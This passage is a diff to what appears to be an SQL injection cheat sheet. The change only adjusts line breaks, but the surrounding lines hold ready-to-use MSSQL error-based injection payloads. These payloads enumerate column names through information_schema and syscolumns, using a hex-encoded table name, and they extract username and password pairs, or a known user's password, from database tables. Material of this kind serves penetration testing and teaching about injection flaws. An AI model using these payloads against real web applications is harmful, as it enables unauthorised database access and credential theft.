@@ -431,7 +431,8 @@ OR
 ```
 and 1 IN (select top 1 column_name from information_schema.columns where TABLE_NAME=cast(0x636c75625f6d656d62657273 as varchar))
 ```
-where the 0x part is table name in hex. \
+where the 0x part is table name in hex.
+
 Check for the next column in a table:
 ```
 and 1 IN (select top 1 cast($DB_NAME..syscolumns.name as varchar(4096)) from $DB_NAME..syscolumns, $DB_NAME..sysobjects where $DB_NAME..syscolumns.id=$DB_NAME..sysobjects.id and $DB_NAME..sysobjects.name='$TABLE_NAME' and $DB_NAME..syscolumns.name NOT IN ('$COLUMN_NAME'))
@@ -446,7 +447,8 @@ Extract the username and password pair from a table:
 ```
 or 1 IN (select top 1 cast(username%2b':::'%2bpassword as varchar(4096)) from $DB_NAME..$TABLE_NAME)
 ```
-where %2b is for string concat, and ':::' is just a seperator. \
+where %2b is for string concat, and ':::' is just a seperator.
+
 Extract an username from a table:
 ```
 and 1 IN (select username from $TABLE_NAME)
@@ -460,6 +462,7 @@ Or just extract the password if the username and table name is known:
 ```
 and 1 IN (select top 1 password from $TABLE_NAME where name='$USERNAME')
 ```
+
 
 
 ### Blind/Boolean based SQL Injection:
